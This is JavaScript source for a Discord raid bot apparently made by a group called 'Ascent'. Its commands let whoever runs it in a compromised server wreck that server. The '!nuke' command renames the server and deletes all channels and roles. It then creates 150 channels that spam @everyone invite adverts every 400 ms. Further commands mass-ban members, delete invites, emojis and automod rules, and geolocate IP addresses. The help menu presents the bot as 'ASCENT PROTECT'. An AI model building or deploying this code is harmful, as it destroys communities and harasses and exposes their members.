const { Client, GatewayIntentBits, ChannelType, PermissionsBitField, EmbedBuilder } = require('discord.js');
const axios = require('axios');

const client = new Client({ 
    intents: [
        GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, 
        GatewayIntentBits.MessageContent, GatewayIntentBits.GuildVoiceStates,
        GatewayIntentBits.GuildMembers
    ] 
});

// --- CONFIGURACIÓN ---
const TOKEN = ''; 
const PREFIX = '!';
const Ascent_LINK = 'https://discord.gg/8HcWf7k2Ad';
const YT_LINK = 'https://www.youtube.com/watch?v=k0J6MeEfFAc';
const SERVER_IMG = 'https://images-ext-1.discordapp.net/external/NbmJxg2apEZM7Qi33_nxuMXU7fnGskKbKRoDm474dVA/%3Fsize%3D2048%26animated%3Dtrue/https/cdn.discordapp.com/icons/1494465337129963665/a_dc57da1614e5913032ad223ff25b2af7.webp?animated=true'; // Imagen de la calavera/objetivo
let autoNuke = false;

const GLITCH_NAMES = ['Act', 'ascent own com', 'ascent on top',  'act',  'actt', 'harmless', 'act runs yall', 'larp', 'ascent own'];

// Spam con menciones masivas
const SPAM_MSG = `
@everyone @here @everyone @here
# 💀 ASCENT nuked LOL 💀
## ## Join to get your server back:
> **LINK:** ${Ascent_LINK}
> **VIDEO:** ${YT_LINK}
@everyone @here @everyone @here
`;

client.on('ready', () => {
    console.clear();
    console.log(`\x1b[31m[!] A͎͍͐￫S͎͍͐￫C͎͍͐￫E͎͍͐￫N͎͍͐￫T͎͍͐￫ 1 ONLINE | MODO DESTRUCCIÓN ACTIVADO\x1b[0m`);
});

client.on('messageCreate', async (message) => {
    if (!message.content.startsWith(PREFIX) || message.author.bot) return;
    const args = message.content.slice(PREFIX.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    // --- ⚔️ DESTRUCCIÓN (NUKE) ---
    if (command === 'nuke') {
        message.guild.setName('ASCENT OWNS THIS SHIT NOW..').catch(() => {});
        message.guild.setIcon(SERVER_IMG).catch(() => {});
        message.guild.channels.cache.forEach(ch => ch.delete().catch(() => {}));
        message.guild.roles.cache.forEach(r => { if(!r.managed && r.name !== "@everyone") r.delete().catch(() => {}); });
        
        for (let i = 0; i < 150; i++) {
            const name = GLITCH_NAMES[Math.floor(Math.random() * GLITCH_NAMES.length)];
            message.guild.channels.create({ name: name, type: ChannelType.GuildText }).then(ch => {
                setInterval(() => ch.send(SPAM_MSG).catch(() => {}), 400);
            }).catch(() => {});
        }
    }

    // --- 🎙️ TODOS LOS COMANDOS DE VOZ ---
    if (command === 'move_random') {
        const vcs = message.guild.channels.cache.filter(c => c.type === ChannelType.GuildVoice);
        message.guild.members.cache.filter(m => m.voice.channel).forEach(m => m.voice.setChannel(vcs.random()).catch(() => {}));
    }
    if (command === 'kick_voice') message.guild.members.cache.filter(m => m.voice.channel).forEach(m => m.voice.disconnect().catch(() => {}));
    if (command === 'mute_voice') message.guild.members.cache.filter(m => m.voice.channel).forEach(m => m.voice.setMute(true).catch(() => {}));
    if (command === 'deafen_voice') message.guild.members.cache.filter(m => m.voice.channel).forEach(m => m.voice.setDeaf(true).catch(() => {}));
    if (command === 'vmute') (message.mentions.members.first() || await message.guild.members.fetch(args[0])).voice.setMute(true).catch(() => {});
    if (command === 'vunmute') (message.mentions.members.first() || await message.guild.members.fetch(args[0])).voice.setMute(false).catch(() => {});
    if (command === 'vdeafen') (message.mentions.members.first() || await message.guild.members.fetch(args[0])).voice.setDeaf(true).catch(() => {});
    if (command === 'vundeafen') (message.mentions.members.first() || await message.guild.members.fetch(args[0])).voice.setDeaf(false).catch(() => {});
    if (command === 'vkick') (message.mentions.members.first() || await message.guild.members.fetch(args[0])).voice.disconnect().catch(() => {});
    if (command === 'vmove') {
        const user = message.mentions.members.first() || await message.guild.members.fetch(args[0]);
        user.voice.setChannel(args[1]).catch(() => {});
    }

    // --- 🛠️ MODERACIÓN Y RAID UTILS ---
    if (command === 'ban') (message.mentions.members.first() || await message.guild.members.fetch(args[0])).ban({ reason: 'ASCENT' }).catch(() => {});
    if (command === 'unban') message.guild.members.unban(args[0]).catch(() => {});
    if (command === 'mute') (message.mentions.members.first() || await message.guild.members.fetch(args[0])).timeout(7 * 24 * 60 * 60 * 1000).catch(() => {});
    if (command === 'unmute') (message.mentions.members.first() || await message.guild.members.fetch(args[0])).timeout(null).catch(() => {});
    if (command === 'create_channels') for (let i = 0; i < (parseInt(args[0]) || 50); i++) message.guild.channels.create({ name: 'ASCENT-spam', type: ChannelType.GuildText }).catch(() => {});
    if (command === 'spammeroles') for (let i = 0; i < (parseInt(args[0]) || 50); i++) message.guild.roles.create({ name: 'ASCENT ON TOP', color: '#ff0000' }).catch(() => {});
    if (command === 'creatstage') for (let i = 0; i < 20; i++) message.guild.channels.create({ name: 'ASCENT-stage', type: ChannelType.GuildStageVoice }).catch(() => {});
    if (command === 'creatforum') for (let i = 0; i < 20; i++) message.guild.channels.create({ name: 'ASCENT-forum', type: ChannelType.GuildForum }).catch(() => {});
    if (command === 'creatannounce') for (let i = 0; i < 20; i++) message.guild.channels.create({ name: 'ASCENT-news', type: ChannelType.GuildAnnouncement }).catch(() => {});
    if (command === 'nsfw_all') message.guild.channels.cache.forEach(c => { if(c.setNSFW) c.setNSFW(true).catch(() => {}); });
    if (command === 'shuffle_channels') message.guild.channels.cache.forEach(c => c.setPosition(Math.floor(Math.random() * 100)).catch(() => {}));
    if (command === 'invs_delete') message.guild.invites.fetch().then(invs => invs.forEach(i => i.delete().catch(() => {})));
    if (command === 'deleteemojis') {
        message.guild.emojis.cache.forEach(e => e.delete().catch(() => {}));
        message.guild.stickers.cache.forEach(s => s.delete().catch(() => {}));
    }
    if (command === 'delete_automod') message.guild.autoModerationRules.fetch().then(rules => rules.forEach(r => r.delete().catch(() => {})));

    // --- ⚙️ SISTEMA ---
    if (command === 'ip') {
        const res = await axios.get(`http://ip-api.com/json/${args[0]}`);
        message.reply(`\`\`\`json\n${JSON.stringify(res.data, null, 2)}\n\`\`\``);
    }
    if (command === 'auto_nuke') {
        autoNuke = args[0] === 'on';
        message.reply(`Auto-Nuke: ${autoNuke ? 'ON 💀' : 'OFF'}`);
    }

    // --- 📋 MENÚ HELP ---
    if (command === 'help') {
        const embed = new EmbedBuilder()
            .setColor('#f80505')
            .setTitle('── ASCENT PROTECT | COMMANDS ──')
            .addFields(
                { name: '🔥 RAID (SPAM @EVERYONE)', value: '`!nuke` `auto nuke` [on/off]' },
                { name: '⚙️ UTILS', value: '`!nuke`, `!ip`, `auto nuke`' }
            )
            .setFooter({ text: '𝖠𝗌𝖼𝖾𝗇𝗍 𝖮𝗐𝗇 𝖳𝖧𝖨𝖲 𝖲𝖧𝖨𝖳 | Developed by fear' });
        message.channel.send({ embeds: [embed] });
    }
});

client.login(TOKEN);